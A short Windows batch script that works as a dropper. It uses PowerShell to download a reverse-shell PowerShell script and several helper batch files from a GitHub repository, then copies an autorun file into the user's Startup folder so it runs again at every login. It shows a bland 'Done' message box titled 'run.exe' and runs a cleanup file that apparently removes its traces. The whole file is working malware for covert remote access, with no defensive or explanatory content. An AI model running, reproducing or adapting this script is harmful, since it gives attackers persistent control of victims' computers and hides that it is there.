@echo off
c:
cd C:\
cd kaas
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/launch.bat -Outfile launch.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/file.bat -Outfile file.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/ReverseShell.ps1 -Outfile ReverseShell.ps1"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/autorun.bat -Outfile autorun.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/DELRUNFILES.bat -Outfile DELRUNFILES.bat"
cd %appdata%
cd Microsoft
cd Windows
cd "Start Menu"
cd Programs
cd Startup
xcopy /s/y c:\kaas\autorun.bat
cd C:\
cd kaas
echo x=msgbox("Done" ,0, "run.exe") >> msgbox.vbs
start msgbox.vbs
DELRUNFILES.bat